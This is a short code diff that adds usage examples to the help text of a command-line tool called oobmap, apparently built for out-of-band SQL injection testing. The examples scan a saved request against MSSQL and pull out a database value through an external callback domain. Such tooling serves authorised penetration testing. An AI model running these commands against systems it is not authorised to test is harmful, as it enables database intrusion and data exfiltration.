@@ -32,6 +32,20 @@ def make_parser():
         prog="oobmap",
         description=None,
         formatter_class=_Formatter,
+        epilog=(
+            "Examples:\n"
+            "  Check for OOB injection (scan all points at level 2, stop on first hit):\n"
+            "    oobmap --check -r req.txt --dbms mssql --domain abc123.oast.site "
+            "--log interactsh.jsonl --level 2 --first\n"
+            "\n"
+            "  Extract a scalar value once a point is confirmed:\n"
+            "    oobmap -r req.txt -p TrackingId --dbms mssql --domain abc123.oast.site "
+            "--log interactsh.jsonl --expr \"SELECT DB_NAME()\"\n"
+            "\n"
+            "  List available tampers or DBMS profiles:\n"
+            "    oobmap tampers\n"
+            "    oobmap profiles"
+        ),
     )
     parser.add_argument("--version", action="version", version=f"oobmap {__version__}")
     parser.set_defaults(func=run)
